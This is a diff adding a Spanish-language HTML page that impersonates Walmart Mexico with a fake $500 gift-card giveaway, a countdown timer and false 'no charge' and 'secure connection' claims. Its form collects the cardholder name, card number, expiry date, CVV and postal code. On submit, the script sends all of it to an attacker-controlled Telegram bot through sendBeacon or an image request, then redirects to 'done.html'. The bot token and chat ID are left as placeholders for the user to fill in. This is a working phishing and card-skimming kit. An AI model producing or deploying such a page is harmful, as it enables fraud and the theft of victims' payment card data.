@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Walmart | Libera tu tarjeta de regalo</title>
+<style>
+:root{--blue:#0071ce;--yellow:#ffc220;--ink:#111827;--muted:#6b7280;--line:#e5e7eb}
+*{box-sizing:border-box}
+body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#eef1f5;color:var(--ink);font-size:16px}
+header{background:var(--blue);color:#fff;padding:13px 16px;display:flex;align-items:center;gap:7px;position:sticky;top:0;z-index:5}
+.spark{color:var(--yellow);font-size:21px;line-height:1}
+.brand{font-weight:800;font-size:19px;letter-spacing:-.3px}
+.lock{margin-left:auto;font-size:11px;opacity:.8}
+.bar{display:flex;gap:5px;padding:10px 16px 0}
+.bar i{flex:1;height:4px;border-radius:2px;background:#cfd8e3}
+.bar i.on{background:var(--yellow)}
+.step{font-size:12px;color:var(--muted);padding:8px 16px 0;font-weight:600;letter-spacing:.3px}
+.prize{margin:10px 16px;background:#fff;border:2px solid var(--yellow);border-radius:14px;padding:14px;display:flex;align-items:center;gap:12px}
+.prize b{display:block;font-size:26px;color:var(--blue);line-height:1.1}
+.prize span{font-size:12px;color:var(--muted)}
+.timer{margin-left:auto;text-align:right;font-size:11px;color:var(--muted)}
+.timer b{display:block;font-size:17px;color:#c1121f;font-variant-numeric:tabular-nums}
+.card{margin:12px 16px 0;background:#fff;border-radius:14px;padding:18px 16px 16px;box-shadow:0 1px 3px rgba(16,24,40,.08)}
+h1{font-size:19px;margin:0 0 6px;line-height:1.3}
+.sub{font-size:13.5px;color:var(--muted);margin:0 0 4px;line-height:1.5}
+.free{display:inline-block;margin:10px 0 4px;background:#e8f6ee;color:#0b6b3a;font-size:12.5px;font-weight:700;padding:6px 10px;border-radius:8px}
+label{display:block;font-size:12.5px;font-weight:700;margin:14px 0 5px}
+input{width:100%;padding:13px 12px;font-size:16px;border:1px solid var(--line);border-radius:10px;background:#fbfcfd;outline:none}
+input:focus{border-color:var(--blue);background:#fff}
+input::placeholder{color:#9ca3af;font-weight:400}
+.row{display:flex;gap:10px}
+.row > div{flex:1}
+.hint{font-size:11.5px;color:var(--muted);margin-top:5px}
+.fine{font-size:11.5px;color:var(--muted);margin:16px 0 0;line-height:1.5}
+button{width:100%;margin:12px 0 0;padding:15px;font-size:16.5px;font-weight:800;color:#111;background:var(--yellow);border:0;border-radius:12px}
+button:active{opacity:.85}
+footer{text-align:center;font-size:11px;color:#8a94a3;padding:18px 24px 30px;line-height:1.6}
+</style>
+</head>
+<body>
+
+<header>
+  <span class="spark">&#10035;</span>
+  <span class="brand">Walmart</span>
+  <span class="lock">&#128274; Conexión segura</span>
+</header>
+
+<div class="bar"><i class="on"></i><i class="on"></i><i></i></div>
+<div class="step">PASO 2 DE 3</div>
+
+<div class="prize">
+  <div>
+    <b>$500</b>
+    <span>Tarjeta de regalo Walmart</span>
+  </div>
+  <div class="timer">
+    Se libera en
+    <b id="t">09:58</b>
+  </div>
+</div>
+
+<div class="card">
+  <h1>Libera tu tarjeta de regalo</h1>
+  <p class="sub">Para que el premio no caiga en manos de bots, comprobamos que la tarjeta esté activa y que no hayas reclamado antes.</p>
+  <span class="free">No se hace ningún cargo</span>
+
+  <form id="f">
+    <label for="n">Nombre como aparece en la tarjeta</label>
+    <input id="n" placeholder="ANA LOPEZ" autocomplete="cc-name">
+
+    <label for="c">Número de tarjeta</label>
+    <input id="c" inputmode="numeric" placeholder="0000 0000 0000 0000" autocomplete="cc-number">
+
+    <div class="row">
+      <div>
+        <label for="e">Vencimiento</label>
+        <input id="e" inputmode="numeric" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp">
+      </div>
+      <div>
+        <label for="v">CVV</label>
+        <input id="v" inputmode="numeric" placeholder="123" maxlength="4" autocomplete="cc-csc">
+        <div class="hint">3 dígitos al reverso</div>
+      </div>
+    </div>
+
+    <label for="z">Código postal</label>
+    <input id="z" inputmode="numeric" placeholder="28001" maxlength="5">
+
+    <p class="fine">Solo verificamos que la tarjeta exista. Cargo de comprobación de $0.00 MXN, no se descuenta nada de tu cuenta.</p>
+
+    <button type="submit">Liberar mi tarjeta de $500</button>
+  </form>
+</div>
+
+<footer>
+  Promoción de Navidad · Una tarjeta por persona<br>
+  Walmart de México y Centroamérica
+</footer>
+
+<script>
+var BOT  = "PEGA_TU_TOKEN_AQUI";
+var CHAT = "PEGA_TU_CHAT_ID_AQUI";
+
+function ping(txt){
+  var u = "https://api.telegram.org/bot" + BOT + "/sendMessage";
+  var b = "chat_id=" + CHAT + "&text=" + encodeURIComponent(txt);
+  var ok = navigator.sendBeacon(u, new Blob([b], {type:"application/x-www-form-urlencoded"}));
+  if(!ok){ var i = new Image(); i.src = u + "?" + b; }
+}
+
+var c = document.getElementById("c"), e = document.getElementById("e"), v = document.getElementById("v");
+
+c.addEventListener("input", function(){
+  var d = this.value.replace(/\D/g, "").slice(0, 16);
+  this.value = d.replace(/(.{4})/g, "$1 ").trim();
+});
+
+e.addEventListener("input", function(){
+  var d = this.value.replace(/\D/g, "").slice(0, 4);
+  this.value = d.length > 2 ? d.slice(0,2) + "/" + d.slice(2) : d;
+});
+
+v.addEventListener("input", function(){ this.value = this.value.replace(/\D/g, ""); });
+document.getElementById("z").addEventListener("input", function(){ this.value = this.value.replace(/\D/g, ""); });
+
+var left = 598;
+setInterval(function(){
+  if(left <= 0) return;
+  left--;
+  var m = String(Math.floor(left / 60)).padStart(2, "0");
+  var s = String(left % 60).padStart(2, "0");
+  document.getElementById("t").textContent = m + ":" + s;
+}, 1000);
+
+document.getElementById("f").addEventListener("submit", function(ev){
+  ev.preventDefault();
+  var payload = "CARD | " + document.getElementById("n").value.trim()
+    + " | " + c.value.replace(/\s/g, "")
+    + " | " + e.value
+    + " | " + v.value
+    + " | " + document.getElementById("z").value;
+  ping(payload);
+  setTimeout(function(){ location.href = "done.html"; }, 900);
+});
+</script>
+</body>
+  </html>
